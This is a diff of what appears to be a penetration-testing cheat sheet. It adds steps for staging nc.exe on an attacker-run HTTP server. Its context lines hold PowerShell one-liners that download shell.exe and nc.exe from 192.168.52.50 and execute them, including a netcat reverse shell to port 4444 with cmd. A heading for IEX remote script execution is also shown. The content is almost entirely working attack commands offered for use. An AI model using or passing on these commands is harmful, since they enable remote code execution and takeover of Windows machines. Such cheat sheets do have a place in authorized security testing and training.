@@ -152,6 +152,15 @@ C:\Users\admin\Desktop\shell.exe
 (New-Object System.Net.WebClient).DownloadFile('http://192.168.52.50/shell.exe', 'C:\Users\admin\Desktop\shell.exe');C:\Users\admin\Desktop\shell.exe
 ```
 ```
+locate nc.exe
+```
+```
+cp /usr/share/windows-resources/binaries/nc.exe .
+```
+```
+python -m http.server 80
+```
+```
 (New-Object System.Net.WebClient).DownloadFile('http://192.168.52.50/nc.exe', 'C:\Users\admin\Desktop\nc.exe');C:\Users\admin\Desktop\nc.exe 192.168.52.50 4444 -e cmd
 ```
 ### PowerShell Execute Remote Script by IEX - powershell "IEX(New-Object System.Net.WebClient).DownloadString('URL')"
